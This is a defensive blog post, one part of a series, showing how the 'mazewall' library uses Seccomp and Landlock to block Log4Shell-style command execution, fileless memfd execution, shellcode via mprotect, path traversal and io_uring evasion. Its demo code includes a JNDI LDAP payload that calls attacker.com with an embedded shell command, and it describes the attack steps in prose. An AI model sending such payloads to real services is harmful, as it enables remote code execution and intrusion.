# Mazewall: The Attacks We Actually Stop

> **Series overview:** This is Part 4 of a 5-part series on behavioral security for cloud-native applications. **What this part adds:** real exploit walkthroughs using the **mazewall** demo codebase—demonstrating how thread-scoped Seccomp and Landlock co-enforcement blocks command execution, fileless malware, JIT shellcode injection, and asynchronous `io_uring` evasion.

---

In Parts 2 and 3, we explored how **mazewall** dynamically profiles your code to generate a behavioral contract (SBoB) and how it enforces this contract at the Linux kernel level.

But a security library is only as good as its defense against active exploitation. Today, we put mazewall to the test it against five real-worldish, high-severity cloud-native attacks.

We will walk through the exact mechanics of these attacks, see how they execute in an unprotected JVM, and watch the Linux kernel surgically block them under mazewall's containment.

---

## The Attack Lab Setup

All demonstrations are drawn from the `demo` module of the mazewall repository. Our setup represents a standard microservice: a vulnerable logging utility that simulates a Log4Shell-style JNDI lookup vulnerability. 

When an attacker sends a malicious payload, the application executes the input, which triggers a ProcessBuilder spawn.

In our unsafe environment, the exploit succeeds instantly:

```kotlin
// BEHAVIORAL PROTECTION: INACTIVE
val payload = "\${jndi:ldap://attacker.com/Exploit?cmd=touch,/tmp/pwned_unsafe}"
UnsafeRunner.run(payload) // Spawn shell command, creating a marker file
```

In our secure environment, the worker thread pool is wrapped with a mazewall policy:

```kotlin
// BEHAVIORAL PROTECTION: ACTIVE
val executor = Executors.newSingleThreadExecutor()
val safeExecutor = ContainedExecutors.wrap(executor, Policy.NO_EXEC)

val payload = "\${jndi:ldap://attacker.com/Exploit?cmd=touch,/tmp/pwned_safe}"
safeExecutor.submit {
    VulnerableLogger.log(payload)
}
```

Let's look at what happens at the systems level during each exploit scenario.

---

## Attack 1: Classic Shell Execution (Log4Shell Style)

### The Threat
An attacker achieves Remote Code Execution (RCE) via a dependency vulnerability (like CVE-2021-44228). The exploitation payload commands the application to spawn a shell process (`/bin/sh`) or run a system utility (`touch`, `curl`, `wget`) to establish a foothold or download malicious assets.

### The Mechanics without Mazewall
1. The vulnerable logger parses the malicious input and triggers Java's `ProcessBuilder.start()`.
2. Under the hood, Java invokes the FFM or native OS bridge, which maps to the Linux `execve(2)` system call.
3. The kernel executes the system call, spawning a new OS process. The attacker successfully compromises the environment.

### The Defense with Mazewall
When the sandboxed worker thread executes `VulnerableLogger.log()`, it does so under `Policy.NO_EXEC`. 

1. `ProcessBuilder` attempts to call `execve`.
2. The kernel's Seccomp engine intercepts the system call on the worker thread.
3. Seccomp evaluates the registered filter, sees that `execve` (and its modern sibling `execveat`) is blocked, and immediately aborts the system call.
4. The system call returns `-1` with `errno` set to `EPERM` (Operation not permitted) directly to the JVM.
5. The JVM translates this into an `IOException` ("Cannot run program..."). The shell process is never spawned.

```
       WORKER THREAD                         LINUX KERNEL
    [ProcessBuilder.start] 
              |
              v
       execve("/bin/sh") -----------> [Seccomp Filter]
                                             |
                                             v (Denied!)
    [IOException] <------------------ Returns EPERM (-1)
 (No process spawned)
```

---

## Attack 2: Fileless Malware (In-Memory execution)

### The Threat
Savvy attackers avoid writing binaries to disk to evade signature-based Endpoint Detection and Response (EDR) agents. Instead, they use a technique called **fileless execution**: they create an anonymous file descriptor in virtual memory, write a malicious binary directly to it, and execute it straight from memory.

### The Mechanics without Mazewall
1. The attacker achieves ACE and invokes the Linux system call `memfd_create(2)` to allocate an anonymous memory-backed file descriptor.
2. They write the compiled ELF payload into the file descriptor.
3. They invoke `execveat(2)` using the file descriptor (e.g. `/proc/self/fd/<fd>`) to execute the binary directly from RAM, leaving zero trace on the disk.

### The Defense with Mazewall
Under the `Policy.NO_EXEC` profile, `mazewall` blocks this attack at three separate checkpoints:
1. **`memfd_create` Blocking:** The `memfd_create` system call is blocked by default in Seccomp.
2. **`execveat` Blocking:** Even if the attacker manages to obtain a memory-backed file descriptor through other means, the `execveat` system call is blocked.
3. **Execution Denial:** The kernel immediately aborts the call with `EPERM`. The fileless binary remains passive data and can never transition into an active process.

---

## Attack 3: Shellcode and Memory Pivoting (JIT Evacuation)

### The Threat
If an attacker cannot spawn an external shell, they may attempt to execute native machine code (shellcode) directly inside the JVM's process memory. 

They write shellcode bytes into an existing Java byte array, locate the array's physical memory address, and attempt to pivot that memory region to "executable" state so the CPU can jump to and execute their instructions.

### The Mechanics without Mazewall
1. The attacker writes their binary payload into a Java byte buffer.
2. They call a native system function (or write off-heap memory via Unsafe) which maps to the Linux `mmap(2)` or `mprotect(2)` system call.
3. They pass `PROT_EXEC` (executable permissions) in the flags to make the memory region executable.
4. The CPU registers are pivoted to point to the address of the shellcode. The shellcode executes with the full privileges of the JVM process.

### The Defense with Mazewall
As detailed in Part 3, mazewall uses Classic BPF (cBPF) argument-level inspection to secure memory without breaking the JIT compiler.

1. The sandboxed thread attempts to invoke `mprotect(address, size, PROT_READ | PROT_WRITE | PROT_EXEC)`.
2. Seccomp intercept matches the `mprotect` system call number.
3. The filter inspects the third argument register (`args[2]`), loading the protection flag bits.
4. It detects the `PROT_EXEC` bit (`0x4`).
5. The filter rejects the call and returns `EPERM`. The memory remains non-executable (W^X violation), and the shellcode causes a harmless JVM `NullPointerException` or `AccessDeniedException` if executed.

```
       Worker Thread (Sandboxed)                  Linux Kernel
    [mprotect(..., PROT_EXEC)] -------> [cBPF Argument Check]
                                                  |
                                                  +---> PROT_EXEC detected!
                                                  |     Returns EPERM (-1)
    [ContainmentViolationException] <-------------+
```

---

## Attack 4: Unauthorized Filesystem Access (Path Traversal)

### The Threat
An attacker exploits a local file disclosure vulnerability (or directory traversal) to read sensitive system configuration files (like `/etc/hosts` or `/etc/passwd`) or API credentials stored in local directories.

### The Mechanics without Mazewall
In a standard JVM, Java's `File.readText()` translates directly to `open(2)` or `openat(2)`. The JVM has full read access to the entire underlying filesystem exposed to the container. The attacker reads any system configuration at will.

### The Defense with Mazewall
Under the generated policy from our dynamic profiling run (Part 2), filesystem access is managed by **Landlock LSM**.

1. The attacker attempts to read `/etc/hosts`.
2. The JVM translates this into the system call `openat(AT_FDCWD, "/etc/hosts", O_RDONLY)`.
3. Because Landlock is path-aware and active on the thread, the kernel intercepts the open request at the VFS (Virtual File System) layer.
4. The kernel checks the Landlock ruleset for the thread. It sees that the only allowed path is `/tmp/mazewall_app_config.json`.
5. The kernel aborts the operation, returning `EACCES` (Permission denied).
6. Mazewall's violation translator catches the JVM exception and throws a clean, localized `ContainmentViolationException`.

## Attack 5: Asynchronous Evasion via `io_uring`

This scenario represents a complex systems-level security validation.

### The Threat
High-performance workloads (such as Netty-based network loops) require modern Linux asynchronous engines like **`io_uring`**. 

To allow this workload, Seccomp must whitelist the initial `io_uring_setup(2)` and `io_uring_enter(2)` system calls. However, Seccomp is fundamentally **blind** to the contents of `io_uring` queues. 

Because `io_uring` works by sharing a lockless ring buffer in memory between userspace and kernelspace, an attacker can submit filesystem reads (like `/etc/hosts`) or network writes by writing commands directly into the queue. The kernel processes these commands asynchronously using background worker threads (`io-wq`), bypassing thread-scoped Seccomp filters entirely!

```
    [SANDBOXED THREAD] 
      |
      | writes command to
      v
    Shared Memory Ring Queue  === (Seccomp is blind to memory writes!) ===> [KERNEL WORKER]
                                                                                |
                                                                                v
                                                                          Executes read of
                                                                             /etc/hosts
```

This is the classic asynchronous evasion vector.

### The Defense: Seccomp and Landlock Co-enforcement
Mazewall neutralizes this bypass through the **complementary co-enforcement of Seccomp and Landlock**:

1. **Seccomp** whitelists `io_uring_setup` so the application can initialize its high-performance ring buffer.
2. The attacker uses `io_uring` to submit an asynchronous read command targeting `/etc/hosts`.
3. The kernel's asynchronous workqueue worker (`io-wq`) picks up the command from the shared-memory queue.
4. **The Critical Kernel Invariant:** Before executing the command, the Linux kernel automatically **copies the credentials** of the submitting thread—including its active **Landlock LSM ruleset**—to the asynchronous worker thread.
5. When the worker thread attempts to execute the read on `/etc/hosts`, the kernel's Landlock hook intercepts the call at the VFS layer.
6. The read is blocked and returns `EACCES` (Permission denied).

```
   Worker Thread (Sandboxed)                  Kernel Async Worker (io-wq)
    [Writes io_uring read command]
                  |
                  v
    Shared Memory Queue -----------------------> Inherits Landlock Ruleset
                                                               |
                                                               v
                                                 Intercepts VFS read("/etc/hosts")
                                                               |
                                                               v (Blocked!)
                                                        Returns EACCES
```

This illustrates the structural advantage of complementary co-enforcement. Seccomp handles the system call surface (allowing high-performance asynchronous setups), while Landlock acts as the VFS backstop, ensuring that asynchronous worker threads remain bound to the application thread's security contract regardless of how they are invoked.

We have verified that Mazewall enforces the Software Bill of Behavior against advanced native exploitation vectors, including asynchronous evasion.

But how does this work in large-scale production? How do we handle massive, dynamic JVM frameworks (like Spring or Micronaut) where reflection, dynamic proxy generation, and massive dependency graphs make runtime profiling complex?

In **Part 5**, we will explore how to scale SBoB generation to production using Ahead-of-Time (AOT) compilation and GraalVM Native Image.
